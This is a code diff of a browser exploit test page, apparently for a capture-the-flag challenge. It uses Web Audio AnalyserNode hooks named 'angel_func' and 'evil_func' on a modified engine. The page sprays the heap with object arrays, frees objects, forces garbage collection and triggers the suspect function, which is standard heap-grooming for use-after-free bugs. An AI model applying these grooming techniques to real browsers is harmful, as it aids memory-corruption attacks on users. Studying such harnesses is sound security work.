@@ -1,108 +1,68 @@
-<head>
-<script src="test_proto.js"></script>
-</head>
-    
 <body>
 <iframe id="frame" src=""></iframe>
 <br>
-<button onclick="start()">Start</button>
-<button onclick="createEmbedded()">Create embed</button>
-<button onclick="removeEmbedded()">Remove embed</button>
-<button onclick="trigger()">Trigger</button>
 <button onclick="query()">Query</button>
 <button onclick="alloc()">Alloc</button>
 <button onclick="gc()">gc</button>
 <button onclick="spray()">Spray</button>
-<button onclick="optimize()">JS Optimize</button>
+<button onclick="multiple_alloc()">Alloc multi</button>
 <script>
 var audioContext;
 var analyserNode;
-var worker;
 var barrier = [];
-var embed;
 var holes = [];
 
-function start() {
-    document.getElementById("frame").src = "http://127.0.0.1/tmp.html";
-}
-
-function optimize() {
-    for (let i = 0; i < 0x10000; ++i)
-	worker.GetURL();
-}
-
-function createEmbedded() {
-    embed = document.createElement("embed");
-    embed.setAttribute('src', "data:video/mp4;");
-    document.body.appendChild(embed);
-    embed.addEventListener("DOMNodeRemoved", function() {
-    	alert(embed.GetURL);
-    });
-}
-
-function removeEmbedded() {
-    document.body.removeChild(embed);
-}
-
 function spray() {
-    let tmp1;
-    let tmp2;
-    for (let i = 0; i < 207; ++i) {
+    for (let i = 0; i < 248; ++i) {
 	barrier.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
     }
-    for (let j = 0; j < 2; ++j) {
-	let tmp_arr = []
-	if (j == 0)
-	    tmp1 = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-	else
-	    tmp2 = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+
+    let tmp1 = [];
+    for (let j = 0; j < 4; ++j) {
+	let tmp_arr = [];
+	tmp1.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 	for (let i = 0; i < 250; ++i) {
 	    tmp_arr.push({a: "a", b: "b", c: "c", d: "d", e: "e"});
 	}
 	holes.push(tmp_arr);
     }
-    analyserNode.angel_func(worker, tmp1);
-    analyserNode.angel_func(worker, tmp2);
-    tmp1 = undefined;
-    tmp2 = undefined;
-    for (let i = 0; i < 10; ++i)
-	gc();
+    for (let i = 0; i < tmp1.length; ++i)
+	analyserNode.angel_func(tmp1[i]);
+    for (let i = 0; i < tmp1.length; ++i)
+	tmp1[i] = undefined;
+    gc();
+    query();
 }
 
-function MyObject() {
-    this.name = "Object";
-    this.scriptObject = {
-    	GetURL: "hahahaha",
+var new_objs = [];
+function alloc() {
+    let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+    new_objs.push(tmp);
+    analyserNode.angel_func(tmp);
+}
+
+function multiple_alloc() {
+    for (let i = 0; i < 4; ++i) {
+	let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
+	new_objs.push(tmp);
+	analyserNode.angel_func(tmp);
     }
 }
 
-function alloc() {
-    barrier = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    analyserNode.angel_func(worker, barrier);
-}
-
 function gc() {
-    for (let i = 0; i < 0x50; i++) { new ArrayBuffer(0x1000000); }
-}
-function trigger() {
-    document.getElementById("frame").src = "http://127.0.0.1/tmp2.html";
-    gc();
-}
-function query() {
-    // gc();
-    // barrier = createPluginReplacement();
-    // let tmp = {a: "a", b: "b", c: "c", d: "d", e: "e"};
-    analyserNode.evil_func(worker);
+    for (let i = 0; i < 0x40; i++) { new ArrayBuffer(0x1000000); }
 }
 
-window.addEventListener("message", (event) => {
-    worker = window.frames[0].document.getElementById("worker");
-}, false);
+function query() {
+    analyserNode.evil_func();
+}
+
 try {
     audioContext = new AudioContext();
 } catch(e) {
     alert('Web Audio API is not supported in this browser');
 }
+
 analyserNode = audioContext.createAnalyser();
 
 </script>
